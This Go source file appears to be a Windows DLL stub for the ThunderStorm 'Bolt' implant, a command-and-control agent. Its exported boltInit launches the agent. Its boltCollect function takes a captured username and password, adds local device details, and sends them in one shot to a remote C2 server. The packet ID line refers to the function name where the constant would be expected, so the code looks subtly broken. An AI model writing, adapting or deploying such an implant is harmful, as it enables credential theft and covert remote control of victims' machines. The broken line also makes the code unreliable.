// +build windows
// ThunderStorm Bolt Agent Launcher Stub with Oneshot

package main

import "C"
import (
	"runtime/debug"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
	"golang.org/x/sys/windows"
)

const boltCollectID = 77

var boltUnlock = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetProcessVersion")

func main() {}

//export boltInit
func boltInit() {
	debug.SetMaxStack(256000000)
	bolt.LaunchEx(
		boltGuardian, boltFiles, boltKey, func() { boltUnlock.Call(13371) }, func() { boltUnlock.Call(13372) },
	)
}

//export boltCollect
func boltCollect(us C.int, u *C.char, ps C.int, p *C.char) {
	debug.SetMaxStack(256000000)
	var (
		ub, pb = []byte(C.GoStringN(u, us)), []byte(C.GoStringN(p, ps))
		ur, pr = make([]rune, us/2), make([]rune, ps/2)
	)
	for i := 0; i < len(ub); i += 2 {
		ur[i/2] = rune(ub[i])
	}
	for i := 0; i < len(pb); i += 2 {
		pr[i/2] = rune(pb[i])
	}
	var c c2.Config
	if err := c.ReadBytes(boltConfig); err != nil {
		return
	}
	i, err := c.Profile()
	if err != nil {
		return
	}
	d := &com.Packet{ID: boltCollect}
	d.WriteString(string(ur))
	d.WriteString(string(pr))
	device.Local.MarshalStream(d)
	c2.Default.Oneshot(boltServer, nil, i, d)
}
